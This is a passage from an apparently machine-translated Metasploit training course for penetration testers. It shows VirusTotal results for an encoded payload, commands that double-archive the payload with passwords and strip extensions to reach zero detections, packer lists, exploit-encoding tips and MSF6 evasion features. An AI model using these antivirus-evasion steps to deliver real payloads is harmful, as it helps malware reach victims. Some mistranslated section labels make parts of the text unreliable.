 ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510
 AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Acronis               false     1.2.0.108                                                20220426
 Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510
 AhnLab-V3             false     3.21.3.10230                                             20220510
 Antiy-AVL             false     3.0                                                      20220510
 Arcabit               false     1.0.0.889                                                20220510
 Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Avira                 false     8.3.3.14                                                 20220510
 Baidu                 false     1.0.0.2                                                  20190318
 BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510
 BitDefenderTheta      false     7.2.37796.0                                              20220428
 Bkav                  false     1.3.0.9899                                               20220509
 CAT-QuickHeal         false     14.00                                                    20220510
 CMC                   false     2.10.2019.1                                              20211026
 ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509
 Comodo                false     34607                                                    20220510
 Cynet                 false     4.0.0.27                                                 20220510
 Cyren                 false     6.5.1.2                                                  20220510
 DrWeb                 false     7.0.56.4040                                              20220510
 ESET-NOD32            false     25243                                                    20220510
 Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510
 F-Secure              false     18.10.978.51                                             20220510
 FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510
 Fortinet              false     6.2.142.0                                                20220510
 GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510
 Gridinsoft            false     1.0.77.174                                               20220510
 Ikarus                false     6.0.24.0                                                 20220509
 Jiangmin              false     16.0.100                                                 20220509
 K7AntiVirus           false     12.12.42275                                              20220510
 K7GW                  false     12.12.42275                                              20220510
 Kaspersky             false     21.0.1.45                                                20220510
 Kingsoft              false     2017.9.26.565                                            20220510
 Lionic                false     7.5                                                      20220510
 MAX                   true      2019.9.16.1           malware (ai score=89)              20220510
 Malwarebytes          false     4.2.2.27                                                 20220510
 MaxSecure             false     1.0.0.1                                                  20220510
 McAfee                false     6.0.6.653                                                20220510
 McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510
 MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510
 Microsoft             false     1.1.19200.5                                              20220510
 NANO-Antivirus        false     1.0.146.25588                                            20220510
 Panda                 false     4.6.4.2                                                  20220509
 Rising                false     25.0.0.27                                                20220510
 SUPERAntiSpyware      false     5.6.0.1032                                               20220507
 Sangfor               false     2.14.0.0                                                 20220507
 Sophos                false     1.4.1.0                                                  20220510
 Symantec              false     1.17.0.0                                                 20220510
 TACHYON               false     2022-05-10.02                                            20220510
 Tencent               false     1.0.0.1                                                  20220510
 TrendMicro            false     11.0.0.1006                                              20220510
 TrendMicro-HouseCall  false     10.0.0.1040                                              20220510
 VBA32                 false     5.0.0                                                    20220506
 ViRobot               false     2014.3.20.0                                              20220510
 VirIT                 false     9.5.191                                                  20220509
 Yandex                false     5.5.2.24                                                 20220428
 Zillya                false     2.0.0.4627                                               20220509
 ZoneAlarm             false     1.0                                                      20220510
 Zoner                 false     2.2.2.0                                                  20220509
```

现在，尝试将其存档两次，在创建时为两个存档都设置密码，并从它们的名称中删除`.rar`/ `.zip`/`.7z`扩展名。为此，我们可以从 RARLabs 安装[RAR 实用程序](https://www.rarlab.com/download.htm)，它的工作方式与 Windows 上的 WinRAR 完全一样。

#### 存档有效负载

 存档有效负载

```shell-session
vnswer77@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
vnswer77@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
vnswer77@htb[/htb]$ rar a ~/test.rar -p ~/test.js

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test.rar
Adding    test.js                                                     OK 
Done
```

 存档有效负载

```shell-session
vnswer77@htb[/htb]$ ls

test.js   test.rar
```

#### 删除 .RAR 扩展名

 删除 .RAR 扩展名

```shell-session
vnswer77@htb[/htb]$ mv test.rar test
vnswer77@htb[/htb]$ ls

test   test.js
```

#### 再次归档有效负载

 再次归档有效负载

```shell-session
vnswer77@htb[/htb]$ rar a test2.rar -p test

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test2.rar
Adding    test                                                        OK 
Done
```

#### 删除 .RAR 扩展名

 删除 .RAR 扩展名

```shell-session
vnswer77@htb[/htb]$ mv test2.rar test2
vnswer77@htb[/htb]$ ls

test   test2   test.js
```

test2 文件是最终的 .rar 存档文件，其扩展名 (.rar) 从名称中删除。之后，我们可以继续将其上传到 VirusTotal 以进行另一次检查。

#### 病毒总数

 病毒总数

```shell-session
vnswer77@htb[/htb]$ msf-virustotal -k <API key> -f test2

[*] Using API key: <API key>
[*] Please wait while I upload test2...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d
[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429
[*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167804
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
=================================================================================================

 Antivirus             Detected  Version         Result  Update
 ---------             --------  -------         ------  ------
 ALYac                 false     1.1.3.1                 20220510
 Acronis               false     1.2.0.108               20220426
 Ad-Aware              false     3.0.21.193              20220510
 AhnLab-V3             false     3.21.3.10230            20220510
 Antiy-AVL             false     3.0                     20220510
 Arcabit               false     1.0.0.889               20220510
 Avira                 false     8.3.3.14                20220510
 BitDefender           false     7.2                     20220510
 BitDefenderTheta      false     7.2.37796.0             20220428
 Bkav                  false     1.3.0.9899              20220509
 CAT-QuickHeal         false     14.00                   20220510
 CMC                   false     2.10.2019.1             20211026
 ClamAV                false     0.105.0.0               20220509
 Comodo                false     34606                   20220509
 Cynet                 false     4.0.0.27                20220510
 Cyren                 false     6.5.1.2                 20220510
 DrWeb                 false     7.0.56.4040             20220510
 ESET-NOD32            false     25243                   20220510
 Emsisoft              false     2021.5.0.7597           20220510
 F-Secure              false     18.10.978.51            20220510
 FireEye               false     35.24.1.0               20220510
 Fortinet              false     6.2.142.0               20220510
 Gridinsoft            false     1.0.77.174              20220510
 Jiangmin              false     16.0.100                20220509
 K7AntiVirus           false     12.12.42275             20220510
 K7GW                  false     12.12.42275             20220510
 Kingsoft              false     2017.9.26.565           20220510
 Lionic                false     7.5                     20220510
 MAX                   false     2019.9.16.1             20220510
 Malwarebytes          false     4.2.2.27                20220510
 MaxSecure             false     1.0.0.1                 20220510
 McAfee-GW-Edition     false     v2019.1.2+3728          20220510
 MicroWorld-eScan      false     14.0.409.0              20220510
 NANO-Antivirus        false     1.0.146.25588           20220510
 Panda                 false     4.6.4.2                 20220509
 Rising                false     25.0.0.27               20220510
 SUPERAntiSpyware      false     5.6.0.1032              20220507
 Sangfor               false     2.14.0.0                20220507
 Symantec              false     1.17.0.0                20220510
 TACHYON               false     2022-05-10.02           20220510
 Tencent               false     1.0.0.1                 20220510
 TrendMicro-HouseCall  false     10.0.0.1040             20220510
 VBA32                 false     5.0.0                   20220506
 ViRobot               false     2014.3.20.0             20220510
 VirIT                 false     9.5.191                 20220509
 Yandex                false     5.5.2.24                20220428
 Zillya                false     2.0.0.4627              20220509
 ZoneAlarm             false     1.0                     20220510
 Zoner                 false     2.2.2.0                 20220509
```

`to`正如我们从上面看到的那样，这是一种在目标主机和目标主机之间传输数据的好方法`from`。

------

## 包装工

该术语指的是有效负载与可执行程序和解压缩代码一起打包在一个文件中的过程`Packer`的结果。`executable compression`运行时，解压缩代码将后门可执行文件返回到其原始状态，从而为目标主机上的文件扫描机制提供另一层保护。此过程透明地发生，以便压缩的可执行文件以与原始可执行文件相同的方式运行，同时保留所有原始功能。此外，msfvenom 还提供压缩和更改后门可执行文件的文件结构以及加密底层进程结构的能力。

流行的加壳软件列表：

|                                     |                                          |                                                |
| ----------------------------------- | ---------------------------------------- | ---------------------------------------------- |
| [UPX封隔器](https://upx.github.io/) | [谜保护者](https://enigmaprotector.com/) | [国会议员](https://www.matcode.com/mpress.htm) |
| 备用 EXE 打包程序                   | 执行隐身                                 | 吗啡                                           |
| 水电部                              | 泰米达                                   |                                                |

如果我们想了解有关打包器的更多信息，请查看[PolyPack 项目](https://jon.oberheide.org/files/woot09-polypack.pdf)。

------

## 利用编码

在编写我们的漏洞利用程序或将预先存在的漏洞利用程序移植到框架时，最好确保利用目标系统上实施的安全措施不容易识别漏洞利用代码。

例如，`Buffer Overflow`由于其十六进制缓冲区模式，典型的漏洞可能很容易与通过网络传输的常规流量区分开来。IDS / IPS 部署可以检查流向目标机器的流量，并注意到用于利用代码的特定过度使用模式。

在组装我们的漏洞利用代码时，随机化有助于为这些模式添加一些变化，这将破坏众所周知的漏洞利用缓冲区的 IPS / IDS 数据库签名。`Offset`这可以通过在 msfconsole 模块的代码中输入一个开关来完成：

代号：红宝石

```ruby
'Targets' =>
[
 	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```

除了 BoF 代码之外，应该始终避免使用明显的 NOP sled，在溢出完成后 shellcode 应该着陆的地方。请注意，BoF 代码的目的是使目标机器上运行的服务崩溃，而 NOP sled 是插入我们的 shellcode（有效负载）的分配内存。IPS/IDS 实体会定期检查这两者，因此最好在将我们的自定义漏洞代码部署到客户端网络之前针对沙箱环境测试它。当然，我们可能只有一次机会在评估期间正确地做到这一点。

有关利用代码的更多信息，我们建议您查看No Starch 出版社的[Metasploit - 渗透测试指南。](https://nostarch.com/metasploit)他们深入研究了有关为框架创建漏洞的一些细节。

------

## 从源代码重新编译 Meterpreter

入侵防御系统和防病毒引擎是最常见的防御工具，可以击落目标的初始立足点。这些主要作用于整个恶意文件或存根阶段的签名。

------

## 关于逃避的注意事项

本节涵盖高级别的规避。请留意后面的模块，这些模块将更深入地挖掘更有效地执行规避所需的理论和实践知识。值得在较旧的 HTB 机器上尝试其中的一些技术，或者安装带有较旧版本的 Windows Defender 或免费 AV 引擎的 VM，并练习规避技巧。这是一个庞大的主题，无法在单个部分中充分涵盖。

[以前的](https://academy.hackthebox.com/module/39/section/418)标记完成和下一步[下一个](https://academy.hackthebox.com/module/39/section/493)

备忘单

##### 目录

###### 介绍

[前言](https://academy.hackthebox.com/module/39/section/381)[Metasploit简介](https://academy.hackthebox.com/module/39/section/383)[MSF控制台介绍](https://academy.hackthebox.com/module/39/section/384)

###### MSF 组件

[ 模块](https://academy.hackthebox.com/module/39/section/404)[目标](https://academy.hackthebox.com/module/39/section/408)[ 有效载荷](https://academy.hackthebox.com/module/39/section/407)[编码器](https://academy.hackthebox.com/module/39/section/409)[数据库](https://academy.hackthebox.com/module/39/section/411)[插件和混合](https://academy.hackthebox.com/module/39/section/413)

###### 无国界医生会议

[ 会议和工作](https://academy.hackthebox.com/module/39/section/415)[ 计价器](https://academy.hackthebox.com/module/39/section/414)

###### 附加功能

[编写和导入模块](https://academy.hackthebox.com/module/39/section/417)[MSF毒液简介](https://academy.hackthebox.com/module/39/section/418)[防火墙和 IDS/IPS 规避](https://academy.hackthebox.com/module/39/section/416)[Metasploit 框架更新 - 2020 年 8 月](https://academy.hackthebox.com/module/39/section/493)

##### 我的工作站

# Metasploit 框架更新 - 2020 年 8 月

------

更新到 MSF6 将使所有以前的负载会话无法使用（如果它们是使用 MSF5 建立的）。此外，使用 MSF5 生成的有效负载将不适用于 MSF6 通信机制。我们在下面总结了 2020 年 8 月 MSF 控制台更新带来的更改和添加。

------

## 生成特征

- 所有五种实现（Windows、Python、Java、Mettle 和 PHP）的跨 Meterpreter 会话的端到端加密
- SMBv3 客户端支持以进一步启用现代开发工作流程
- Windows shellcode 的新多态负载生成例程，可提高针对常见防病毒和入侵检测系统 (IDS) 产品的规避能力

------

## 扩展加密

- 为某些网络操作和 Metasploit 的主要有效载荷二进制文件创建基于签名的检测的复杂性增加
- 在攻击者和目标系统之间的通信期间，所有 Meterpreter 有效负载将使用 AES 加密
- SMBv3 加密集成将增加用于识别通过 SMB 执行的关键操作的基于签名的检测的复杂性

------

## 更清洁的有效载荷工件

- Windows Meterpreter 使用的 DLL 现在通过序号而不是名称解析必要的函数
- 反射加载 DLL 使用的标准导出 ReflectiveLoader 不再作为文本数据出现在负载二进制文件中
- Meterpreter 向框架公开的命令现在被编码为整数而不是字符串

------

## 插件

旧的 Mimikatz Meterpreter 扩展被移除，取而代之的是它的继任者 Kiwi。因此，在可预见的未来，加载 Mimikatz 的尝试将加载 Kiwi。

------

## 有效载荷

将 shellcode 静态生成例程替换为随机化例程，该例程通过每次随机化指令向该关键存根添加多态属性。要阅读有关这些更改的更多信息并查看完整的更改日志，请[点击此链接](https://blog.rapid7.com/2020/08/06/metasploit-6-now-under-active-development/)。

------

## 结束语

正如我们在本模块中看到的，Metasploit 是一个强大的框架。虽然经常被误用和贴错标签，但如果使用得当，它可以成为我们渗透测试武器库的重要组成部分。它具有高度可扩展性，非常适合在评估期间跟踪数据，并且非常适合后期开发和促进枢转。值得尝试 Metasploit 提供的所有功能；您可能会找到一种非常适合您的工作流程的方式。如果你想避免它，那也没关系！那里有很多工具，我们应该使用我们最熟悉的工具。要使用此工具进行更多练习，请查看本模块末尾标记的 HTB 盒子，或使用 Metasploit 尝试任何盒子或 Academy 模块目标。您还可以在 Dante Pro Lab 中练习它（尤其是它的旋转能力）。

[以前的](https://academy.hackthebox.com/module/39/section/416)结束

备忘单
